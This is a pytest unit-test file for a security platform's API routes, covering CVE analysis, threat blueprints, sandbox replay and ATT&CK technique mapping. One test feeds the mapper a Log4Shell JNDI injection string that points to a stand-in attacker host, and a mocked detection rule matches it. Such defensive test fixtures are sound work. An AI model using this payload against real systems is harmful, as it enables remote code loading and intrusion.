"""Unit tests for the Phase 3 API routes."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from api.main import app


@pytest.fixture
def client() -> TestClient:
    with TestClient(app) as c:
        yield c


# ---------------------------------------------------------------------------
# POST /vulnerability/analyze
# ---------------------------------------------------------------------------


class TestVulnerabilityAnalyzeRoute:
    def test_returns_200_on_success(self, client):
        mock_analysis = MagicMock()
        mock_analysis.model_dump.return_value = {
            "cve_id": "CVE-2021-44228",
            "node_id": "CVE-2021-44228",
            "cvss_score": 10.0,
            "severity": "CRITICAL",
            "technique_mappings": [],
        }
        with patch(
            "api.routes.vulnerability.VulnerabilityIntelligenceAgent"
        ) as mock_agent:
            mock_agent.return_value.analyze.return_value = mock_analysis
            resp = client.post(
                "/vulnerability/analyze", json={"cve_id": "CVE-2021-44228"}
            )
        assert resp.status_code == 200
        data = resp.json()
        assert data["cve_id"] == "CVE-2021-44228"

    def test_returns_404_for_unknown_cve(self, client):
        from core.agents.vulnerability.exceptions import NVDCVENotFoundError

        with patch(
            "api.routes.vulnerability.VulnerabilityIntelligenceAgent"
        ) as mock_agent:
            mock_agent.return_value.analyze.side_effect = NVDCVENotFoundError(
                "Not found"
            )
            resp = client.post(
                "/vulnerability/analyze", json={"cve_id": "CVE-9999-99999"}
            )
        assert resp.status_code == 404

    def test_returns_503_for_nvd_offline(self, client):
        from core.agents.vulnerability.exceptions import NVDOfflineError

        with patch(
            "api.routes.vulnerability.VulnerabilityIntelligenceAgent"
        ) as mock_agent:
            mock_agent.return_value.analyze.side_effect = NVDOfflineError("NVD down")
            resp = client.post(
                "/vulnerability/analyze", json={"cve_id": "CVE-2021-44228"}
            )
        assert resp.status_code == 503

    def test_requires_cve_id_field(self, client):
        resp = client.post("/vulnerability/analyze", json={})
        assert resp.status_code == 422  # Missing required field


# ---------------------------------------------------------------------------
# GET /vulnerability/cves
# ---------------------------------------------------------------------------


class TestVulnerabilityCVEsRoute:
    def test_returns_200_with_list(self, client):
        with patch("api.routes.vulnerability.NVDClient") as mock_nvd:
            mock_nvd.return_value.get_cached_cves.return_value = [
                {"cve_id": "CVE-2021-44228", "fetched_at": "2024-01-01"},
            ]
            resp = client.get("/vulnerability/cves")
        assert resp.status_code == 200
        assert isinstance(resp.json(), list)

    def test_pagination_parameters(self, client):
        with patch("api.routes.vulnerability.NVDClient") as mock_nvd:
            mock_nvd.return_value.get_cached_cves.return_value = []
            resp = client.get("/vulnerability/cves?limit=10&offset=0")
        assert resp.status_code == 200

    def test_invalid_limit_rejected(self, client):
        resp = client.get("/vulnerability/cves?limit=0")
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# POST /vulnerability/blueprint
# ---------------------------------------------------------------------------


class TestBlueprintRoute:
    def test_returns_200_on_success(self, client):
        mock_bp = MagicMock()
        mock_bp.model_dump.return_value = {
            "blueprint_id": "BP-CVE-2021-44228-ABCD1234",
            "cve_id": "CVE-2021-44228",
            "techniques": [],
            "edges": [],
            "total_confidence": 0.75,
        }
        with patch("api.routes.vulnerability.ThreatReconstructionAgent") as mock_agent:
            mock_agent.return_value.blueprint.return_value = mock_bp
            resp = client.post(
                "/vulnerability/blueprint", json={"cve_id": "CVE-2021-44228"}
            )
        assert resp.status_code == 200

    def test_returns_404_when_cve_not_analyzed(self, client):
        from core.agents.threat_reconstruction.exceptions import CVENotAnalyzedError

        with patch("api.routes.vulnerability.ThreatReconstructionAgent") as mock_agent:
            mock_agent.return_value.blueprint.side_effect = CVENotAnalyzedError(
                "Not found"
            )
            resp = client.post(
                "/vulnerability/blueprint", json={"cve_id": "CVE-9999-00000"}
            )
        assert resp.status_code == 404


# ---------------------------------------------------------------------------
# POST /sandbox/replay
# ---------------------------------------------------------------------------


class TestSandboxReplayRoute:
    def test_returns_202_on_success(self, client):
        mock_session = MagicMock()
        mock_session.model_dump.return_value = {
            "session_id": "RS-ABCDEF123456",
            "blueprint_id": "BP-CVE-2021-44228-ABCD1234",
            "cve_id": "CVE-2021-44228",
            "status": "completed",
            "telemetry_artifacts": [],
            "technique_results": [],
        }
        mock_bp = MagicMock()
        mock_bp.blueprint_id = "BP-CVE-2021-44228-ABCD1234"
        with (
            patch("api.routes.sandbox.ThreatReconstructionAgent") as mock_tr,
            patch("api.routes.sandbox.SandboxReplayAgent") as mock_ra,
        ):
            mock_tr.return_value.blueprint.return_value = mock_bp
            mock_ra.return_value.replay.return_value = mock_session
            resp = client.post(
                "/sandbox/replay",
                json={
                    "cve_id": "CVE-2021-44228",
                    "blueprint_id": "BP-CVE-2021-44228-ABCD1234",
                    "dry_run": True,
                },
            )
        assert resp.status_code == 202

    def test_requires_cve_id(self, client):
        resp = client.post("/sandbox/replay", json={"dry_run": True})
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# GET /sandbox/sessions
# ---------------------------------------------------------------------------


class TestSandboxSessionsRoute:
    def test_returns_list(self, client):
        with patch("api.routes.sandbox.PostgresClient") as mock_db:
            mock_db.return_value.fetch_all.return_value = []
            resp = client.get("/sandbox/sessions")
        assert resp.status_code == 200
        assert isinstance(resp.json(), list)

    def test_filters_by_cve_id(self, client):
        with patch("api.routes.sandbox.PostgresClient") as mock_db:
            mock_db.return_value.fetch_all.return_value = []
            resp = client.get("/sandbox/sessions?cve_id=CVE-2021-44228")
        assert resp.status_code == 200


# ---------------------------------------------------------------------------
# POST /attack/map
# ---------------------------------------------------------------------------


class TestAttackMapRoute:
    def test_returns_mapping_results(self, client):
        mock_result = MagicMock()
        mock_result.model_dump.return_value = {
            "evidence_id": "EV-001",
            "technique_id": "T1190",
            "technique_name": "Exploit Public-Facing Application",
            "tactic": "initial-access",
            "confidence": 0.85,
            "rule_name": "log4shell_jndi",
            "rationale": "Pattern matched",
            "matched_text": "${jndi:ldap://",
        }
        with patch("api.routes.attack_mapper.ATTACKMapper") as mock_mapper:
            mock_mapper.return_value.map_text.return_value = [mock_result]
            resp = client.post(
                "/attack/map",
                json={
                    "evidence_id": "EV-001",
                    "text": "${jndi:ldap://attacker.com/x}",
                },
            )
        assert resp.status_code == 200
        data = resp.json()
        assert isinstance(data, list)
        assert data[0]["technique_id"] == "T1190"

    def test_returns_empty_list_for_no_match(self, client):
        with patch("api.routes.attack_mapper.ATTACKMapper") as mock_mapper:
            mock_mapper.return_value.map_text.return_value = []
            resp = client.post(
                "/attack/map",
                json={
                    "evidence_id": "EV-001",
                    "text": "Nothing suspicious here",
                },
            )
        assert resp.status_code == 200
        assert resp.json() == []
